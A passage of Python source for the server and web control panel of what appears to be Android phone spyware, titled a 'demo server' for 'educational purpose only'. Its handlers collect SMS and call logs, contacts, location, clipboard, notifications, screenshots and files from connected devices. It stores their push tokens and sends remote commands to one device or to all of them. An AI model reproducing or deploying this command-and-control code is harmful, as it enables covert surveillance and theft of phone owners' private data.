            count = message.get("count", 0)
            self.log(f"[i] Active notifications from session {session.session_id} ({count} notifications):")
            for n in notifications[:20]:
                self.log(f"    [{n.get('package', '?')}] {n.get('title', '')}: {n.get('text', '')}")
            if count > 20:
                self.log(f"    ... and {count - 20} more")
            self.log_to_file(message, session.address)

        elif msg_type == "fcm_token":
            token = message.get("token", "")
            device_id = message.get("device_id", session.device_id)
            session.fcm_token = token
            # Store token in device_tokens.json for persistence
            tokens_file = "device_tokens.json"
            try:
                tokens = {}
                if os.path.exists(tokens_file):
                    with open(tokens_file, 'r') as f:
                        tokens = json.load(f)
                tokens[device_id] = token
                with open(tokens_file, 'w') as f:
                    json.dump(tokens, f, indent=2)
            except Exception as e:
                self.log(f"[!] Failed to save FCM token: {e}")
            self.log(f"[i] FCM token received from device {device_id}: {token[:30]}...")
            self.log_to_file(message, session.address)

        else:
            self.log(f"[i] Message from session {session.session_id}: {msg_type}")
            self.log_to_file(message, session.address)


# === HTTP SERVER FOR WEB GUI ===

class ThreadedHTTPRequestHandler(BaseHTTPRequestHandler):
    """Handle HTTP requests for the web GUI."""

    server_instance = None

    def log_message(self, format, *args):
        pass

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        query = urllib.parse.parse_qs(parsed.query)

        if path == '/' or path == '/index.html':
            self.serve_file('index.html', 'text/html')
        elif path == '/style.css':
            self.serve_file('style.css', 'text/css')
        elif path == '/script.js':
            self.serve_file('script.js', 'application/javascript')
        elif path == '/api/devices':
            self.handle_get_devices()
        elif path == '/api/logs':
            self.handle_get_logs()
        elif path == '/api/stats':
            self.handle_get_stats()
        elif path == '/api/command':
            self.handle_get_command(query)
        elif path == '/api/gallery':
            self.handle_get_gallery(query)
        elif path == '/api/filebrowser':
            self.handle_get_filebrowser(query)
        elif path == '/api/data':
            self.handle_get_data(query)
        elif path == '/api/received-files':
            self.handle_list_received_files(query)
        elif path == '/api/download-file':
            self.handle_download_received_file(query)
        elif path == '/api/screenshots':
            self.handle_get_screenshots(query)
        elif path == '/api/call-logs':
            self.handle_get_call_logs(query)
        elif path == '/api/contacts':
            self.handle_get_contacts(query)
        elif path == '/api/sms-logs':
            self.handle_get_sms_logs(query)
        elif path == '/api/app-list':
            self.handle_get_app_list(query)
        elif path == '/api/location':
            self.handle_get_location(query)
        elif path == '/api/storage':
            self.handle_get_storage(query)
        elif path == '/api/device-info':
            self.handle_get_device_info_data(query)
        elif path == '/api/battery':
            self.handle_get_battery(query)
        elif path == '/api/clipboard':
            self.handle_get_clipboard(query)
        elif path == '/api/fcm-send':
            self.handle_fcm_send(query)
        elif path == '/api/fcm-tokens':
            self.handle_get_fcm_tokens(query)
        else:
            self.send_error(404, "Not Found")

    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path

        if path == '/api/command':
            self.handle_post_command_route()
        else:
            self.send_error(404, "Not Found")

    def handle_post_command_route(self):
        """Read POST body and route to handle_post_command."""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length)
            data = json.loads(body.decode('utf-8'))
            self.handle_post_command(data)
        except Exception as e:
            try:
                self.send_json_response({'status': 'error', 'message': str(e)})
            except:
                pass

    def do_DELETE(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        query = urllib.parse.parse_qs(parsed.query)

        if path == '/api/delete-file':
            self.handle_delete_file(query)
        else:
            self.send_error(404, "Not Found")

    def serve_file(self, filename, content_type):
        try:
            with open(filename, 'rb') as f:
                content = f.read()
            self.send_response(200)
            self.send_header('Content-Type', content_type)
            self.send_header('Content-Length', str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        except FileNotFoundError:
            self.send_error(404, "File Not Found")
        except Exception as e:
            self.send_error(500, "Internal Server Error")

    def handle_get_devices(self):
        if not self.server_instance:
            self.send_error(500, "Server not available")
            return
        with self.server_instance.lock:
            devices = []
            for device_id, session in self.server_instance.sessions.items():
                devices.append({
                    'id': device_id,
                    'session_id': session.session_id,
                    'ip': session.address[0],
                    'model': session.device_info.get('model', 'Unknown'),
                    'status': 'ONLINE' if session.connected else 'OFFLINE',
                    'images': session.total_images_received,
                    'videos': session.total_videos_received,
                    'notifications': session.total_notifications_received
                })
        self.send_json_response(devices)

    def handle_get_logs(self):
        if not self.server_instance:
            self.send_error(500, "Server not available")
            return
        logs = getattr(self.server_instance, 'recent_logs', [])
        self.send_json_response({'logs': logs})

    def handle_get_stats(self):
        if not self.server_instance:
            self.send_error(500, "Server not available")
            return
        self.server_instance.update_stats()
        self.send_json_response(self.server_instance.stats)

    def handle_get_command(self, query):
        if not self.server_instance:
            self.send_error(500, "Server not available")
            return
        command = query.get('command', [''])[0]
        args = query.get('args', ['{}'])[0]
        self.server_instance.send_command_to_all(command, args)
        self.send_json_response({'status': 'sent', 'command': command})

    def handle_post_command(self, data):
        if not self.server_instance:
            self.send_error(500, "Server not available")
            return
        command = data.get('command', '')
        args = data.get('args', '{}')
        session_id = data.get('session_id', None)
        if isinstance(args, dict):
            args = json.dumps(args)
        if session_id is not None and session_id != '' and session_id != 'null':
            # Send to specific device (session_id is now a device_id string)
            with self.server_instance.lock:
                session = self.server_instance.sessions.get(session_id)
            if session and session.connected:
                self.server_instance.send_command(session, command, args)
                self.server_instance.log_command(command, session.session_id)
                self.send_json_response({'status': 'sent', 'command': command, 'session': session_id})
            else:
                self.send_json_response({'status': 'error', 'message': 'Session not found or offline'})
        else:
            self.server_instance.send_command_to_all(command, args)
            self.send_json_response({'status': 'sent', 'command': command})

    def handle_get_gallery(self, query):
        """Return last gallery list from a device."""
        if not self.server_instance:
            self.send_error(500, "Server not available")
            return
        sid = query.get('session', [''])[0]
        with self.server_instance.lock:
            session = self.server_instance.sessions.get(sid)
            if session and session.last_gallery_list is not None:
                self.send_json_response({'gallery': session.last_gallery_list, 'session': sid})
            else:
                self.send_json_response({'gallery': [], 'session': sid, 'error': 'No gallery data yet'})

    def handle_get_filebrowser(self, query):
        """Return last file browser results from a device."""
        if not self.server_instance:
            self.send_error(500, "Server not available")
            return
        sid = query.get('session', [''])[0]
        with self.server_instance.lock:
            session = self.server_instance.sessions.get(sid)
            if session and session.last_file_list is not None:
                self.send_json_response({'files': session.last_file_list, 'session': sid})
            else:
                self.send_json_response({'files': [], 'session': sid, 'error': 'No file browser data yet'})

    def handle_get_data(self, query):
        """Return last data response (contacts, call logs, sms, etc.) from a device."""
        if not self.server_instance:
            self.send_error(500, "Server not available")
            return
        sid = query.get('session', [''])[0]
        dtype = query.get('type', ['all'])[0]
        with self.server_instance.lock:
            session = self.server_instance.sessions.get(sid)
            if not session:
                self.send_json_response({'error': 'Session not found'})
                return
            result = {}
            if dtype in ['all', 'call_logs']:
                result['call_logs'] = session.last_call_logs or []
            if dtype in ['all', 'contacts']:
                result['contacts'] = session.last_contacts or []
            if dtype in ['all', 'sms_logs']:
                result['sms_logs'] = session.last_sms_logs or []
            if dtype in ['all', 'app_list']:
                result['app_list'] = session.last_app_list or []
            if dtype in ['all', 'location']:
                result['location'] = session.last_location or {}
            if dtype in ['all', 'storage']:
                result['storage'] = session.last_storage_info or {}
            if dtype in ['all', 'device_info']:
                result['device_info'] = session.last_device_info or {}
            if dtype in ['all', 'battery_info']:
                result['battery_info'] = session.last_battery_info or {}
            if dtype in ['all', 'clipboard']:
                result['clipboard'] = session.last_clipboard or {}
            result['session'] = sid
            self.send_json_response(result)

    def handle_list_received_files(self, query):
        """List files in received_files directory, scoped to a device."""
        subdir = query.get('dir', [''])[0]
        device_session = query.get('session', [''])[0]
        base_dir = os.path.abspath(RECEIVED_DIR)
        # If a device session is provided, scope browsing to that device's folders
        if device_session:
            # The device's files are under subfolders like images/<device_id>, audio/<device_id>, etc.
            # We set the base to received_files/ and scope the subdir to include device folders.
            # For top-level browsing when a device is selected, show device-specific subdirs.
            if not subdir:
                # Show device-specific folders at top level
                device_dirs = ['images', 'audio', 'videos', 'docs', 'screenshots']
                files_list = []
                for d in device_dirs:
                    device_path = os.path.join(base_dir, d, device_session)
                    if os.path.isdir(device_path):
                        files_list.append({
                            'name': d,
                            'path': f'{d}/{device_session}',
                            'is_dir': True,
                            'size': 0
                        })
                files_list.sort(key=lambda x: x['name'].lower())
                self.send_json_response({'files': files_list, 'current_dir': subdir})
                return
        # Normal browsing within a subdir
        if subdir:
            target_dir = os.path.normpath(os.path.join(base_dir, subdir))
            # Security: prevent path traversal
            if not target_dir.startswith(base_dir):
                self.send_error(403, "Forbidden")
                return
        else:
            target_dir = base_dir

        files_list = []
        if os.path.isdir(target_dir):
            for entry in os.listdir(target_dir):
                entry_path = os.path.join(target_dir, entry)
                rel_path = os.path.relpath(entry_path, base_dir).replace(os.sep, '/')
                is_dir = os.path.isdir(entry_path)
                files_list.append({
                    'name': entry,
                    'path': rel_path,
                    'is_dir': is_dir,
                    'size': os.path.getsize(entry_path) if not is_dir else 0
                })

        files_list.sort(key=lambda x: (not x['is_dir'], x['name'].lower()))
        self.send_json_response({'files': files_list, 'current_dir': subdir})

    def handle_download_received_file(self, query):
        """Download a file from received_files directory."""
        filepath = query.get('path', [''])[0]
        if not filepath:
            self.send_error(400, "Missing 'path' parameter")
            return
        base_dir = os.path.abspath(RECEIVED_DIR)
        full_path = os.path.normpath(os.path.join(base_dir, filepath))
        if not full_path.startswith(base_dir):
            self.send_error(403, "Forbidden")
            return
        if not os.path.isfile(full_path):
            self.send_error(404, "File not found")
            return

        # Determine content type
        ext = os.path.splitext(full_path)[1].lower()
        content_types = {
            '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.png': 'image/png',
            '.gif': 'image/gif', '.webp': 'image/webp', '.bmp': 'image/bmp',
            '.mp4': 'video/mp4', '.3gp': 'video/3gpp', '.avi': 'video/x-msvideo',
            '.mp3': 'audio/mpeg', '.wav': 'audio/wav', '.ogg': 'audio/ogg',
            '.txt': 'text/plain', '.json': 'application/json', '.log': 'text/plain',
            '.pdf': 'application/pdf'
        }
        ct = content_types.get(ext, 'application/octet-stream')

        try:
            with open(full_path, 'rb') as f:
                content = f.read()
            self.send_response(200)
            self.send_header('Content-Type', ct)
            self.send_header('Content-Length', str(len(content)))
            self.send_header('Content-Disposition', f'inline; filename="{os.path.basename(full_path)}"')
            self.end_headers()
            self.wfile.write(content)
        except BrokenPipeError:
            # Client disconnected during download — not a real error, just log it
            pass
        except ConnectionResetError:
            # Client connection reset — same, not a real error
            pass
        except Exception as e:
            try:
                self.send_error(500, f"Error reading file: {e}")
            except (BrokenPipeError, ConnectionResetError):
                pass  # Client already gone

    def handle_get_screenshots(self, query):
        """List screenshot files in received_files/screenshots/<device_id> directory."""
        sid = query.get('session', [''])[0]
        if not sid:
            self.send_json_response({'screenshots': []})
            return
        screenshot_dir = os.path.join(RECEIVED_DIR, "screenshots", sid)
        if not os.path.isdir(screenshot_dir):
            self.send_json_response({'screenshots': []})
            return
        files_list = []
        for entry in os.listdir(screenshot_dir):
            if entry.endswith('.png') or entry.endswith('.jpg') or entry.endswith('.jpeg'):
                entry_path = os.path.join(screenshot_dir, entry)
                rel_path = os.path.relpath(entry_path, RECEIVED_DIR).replace(os.sep, '/')
                files_list.append({
                    'name': entry,
                    'path': rel_path,
                    'is_dir': False,
                    'size': os.path.getsize(entry_path)
                })
        # Sort by name (which includes timestamp) descending so newest first
        files_list.sort(key=lambda x: x['name'], reverse=True)
        self.send_json_response({'screenshots': files_list})

    def handle_get_call_logs(self, query):
        sid = query.get('session', [''])[0]
        with self.server_instance.lock:
            session = self.server_instance.sessions.get(sid)
            self.send_json_response({'call_logs': session.last_call_logs} if session else {'call_logs': []})

    def handle_get_contacts(self, query):
        sid = query.get('session', [''])[0]
        with self.server_instance.lock:
            session = self.server_instance.sessions.get(sid)
            self.send_json_response({'contacts': session.last_contacts} if session else {'contacts': []})

    def handle_get_sms_logs(self, query):
        sid = query.get('session', [''])[0]
        with self.server_instance.lock:
            session = self.server_instance.sessions.get(sid)
            self.send_json_response({'sms_logs': session.last_sms_logs} if session else {'sms_logs': []})

    def handle_get_app_list(self, query):
        sid = query.get('session', [''])[0]
        with self.server_instance.lock:
            session = self.server_instance.sessions.get(sid)
            self.send_json_response({'apps': session.last_app_list} if session else {'apps': []})

    def handle_get_location(self, query):
        sid = query.get('session', [''])[0]
        with self.server_instance.lock:
            session = self.server_instance.sessions.get(sid)
            self.send_json_response({'location': session.last_location} if session else {'location': {}})

    def handle_get_storage(self, query):
        sid = query.get('session', [''])[0]
        with self.server_instance.lock:
            session = self.server_instance.sessions.get(sid)
            self.send_json_response({'storage': session.last_storage_info} if session else {'storage': {}})

    def handle_get_device_info_data(self, query):
        sid = query.get('session', [''])[0]
        with self.server_instance.lock:
            session = self.server_instance.sessions.get(sid)
            self.send_json_response({'device_info': session.last_device_info} if session else {'device_info': {}})

    def handle_get_battery(self, query):
        sid = query.get('session', [''])[0]
        with self.server_instance.lock:
            session = self.server_instance.sessions.get(sid)
            self.send_json_response({'battery': session.last_battery_info} if session else {'battery': {}})

    def handle_get_clipboard(self, query):
        sid = query.get('session', [''])[0]
        with self.server_instance.lock:
            session = self.server_instance.sessions.get(sid)
            self.send_json_response({'clipboard': session.last_clipboard} if session else {'clipboard': {}})

    def handle_fcm_send(self, query):
        """Send an FCM push command to a device."""
        if not self.server_instance:
            self.send_error(500, "Server not available")
            return
        global fcm_sender
        if fcm_sender is None:
            self.send_json_response({'status': 'error', 'message': 'FCM not configured — place service account JSON as firebase-service-account.json'})
            return

        command = query.get('command', [''])[0]
        device_id = query.get('session', [''])[0]
        args_str = query.get('args', ['{}'])[0]

        if not command:
            self.send_json_response({'status': 'error', 'message': 'Missing command'})
            return

        # Get FCM token for this device
        fcm_token = None
        with self.server_instance.lock:
            session = self.server_instance.sessions.get(device_id)
            if session:
                fcm_token = session.fcm_token

        # Fall back to persisted tokens file
        if not fcm_token:
            tokens_file = "device_tokens.json"
            if os.path.exists(tokens_file):
                try:
                    with open(tokens_file, 'r') as f:
                        tokens = json.load(f)
                    fcm_token = tokens.get(device_id)
                except:
                    pass

        if not fcm_token:
            self.send_json_response({'status': 'error', 'message': f'No FCM token for device {device_id}'})
            return

        # Parse extra args
        extra_args = {}
        try:
            extra_args = json.loads(args_str)
        except:
            pass

        result = fcm_sender.send_command(fcm_token, command, extra_args)
        self.send_json_response(result)

    def handle_get_fcm_tokens(self, query):
        """Return stored FCM tokens for all devices."""
        tokens_file = "device_tokens.json"
        tokens = {}
        if os.path.exists(tokens_file):
            try:
                with open(tokens_file, 'r') as f:
                    tokens = json.load(f)
            except:
                pass
        # Also include tokens from active sessions
        if self.server_instance:
            with self.server_instance.lock:
                for device_id, session in self.server_instance.sessions.items():
                    if session.fcm_token:
                        tokens[device_id] = session.fcm_token
        self.send_json_response({'tokens': tokens, 'fcm_configured': fcm_sender is not None})

    def handle_delete_file(self, query):
        """Delete a file from received_files directory."""
        filepath = query.get('path', [''])[0]
        if not filepath:
            self.send_json_response({'status': 'error', 'message': 'Missing path parameter'})
            return
        base_dir = os.path.abspath(RECEIVED_DIR)
        full_path = os.path.normpath(os.path.join(base_dir, filepath))
        if not full_path.startswith(base_dir):
            self.send_json_response({'status': 'error', 'message': 'Forbidden'})
            return
        if not os.path.isfile(full_path):
            self.send_json_response({'status': 'error', 'message': 'File not found'})
            return
        try:
            os.remove(full_path)
            self.send_json_response({'status': 'success', 'message': 'File deleted', 'path': filepath})
        except Exception as e:
            self.send_json_response({'status': 'error', 'message': str(e)})

    def send_json_response(self, data):
        response = json.dumps(data)
        try:
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Content-Length', str(len(response)))
            self.end_headers()
            self.wfile.write(response.encode('utf-8'))
        except (BrokenPipeError, ConnectionResetError):
            pass  # Client disconnected — not a real error


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


def main():
    SOCKET_HOST = '0.0.0.0'
    SOCKET_PORT = 8000
    HTTP_HOST = '0.0.0.0'
    HTTP_PORT = 8080

    log_queue = queue.Queue()

    socket_server = DemoServer(
        host=SOCKET_HOST,
        port=SOCKET_PORT,
        log_queue=log_queue,
        console_mode=False
    )

    ThreadedHTTPRequestHandler.server_instance = socket_server

    http_server = ThreadedHTTPServer((HTTP_HOST, HTTP_PORT), ThreadedHTTPRequestHandler)

    socket_thread = threading.Thread(target=socket_server.start, daemon=True)
    socket_thread.start()

    http_thread = threading.Thread(target=http_server.serve_forever, daemon=True)
    http_thread.start()

    print("=" * 60)
    print("  ANDROID DEVICE DEMO SERVER - VERSION 5.1 WITH WEB GUI")
    print("  Educational Purpose Only")
    print("=" * 60)
    print(f"[+] Socket server listening on {SOCKET_HOST}:{SOCKET_PORT}")
    print(f"[+] HTTP server listening on {HTTP_HOST}:{HTTP_PORT}")
    print(f"[+] Open http://<server-ip>:{HTTP_PORT} in a browser to access the GUI")
    print("=" * 60)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Shutting down servers...")
        socket_server.running = False
        http_server.shutdown()
        time.sleep(2)
        print("[!] Servers stopped.")


if __name__ == "__main__":
    main()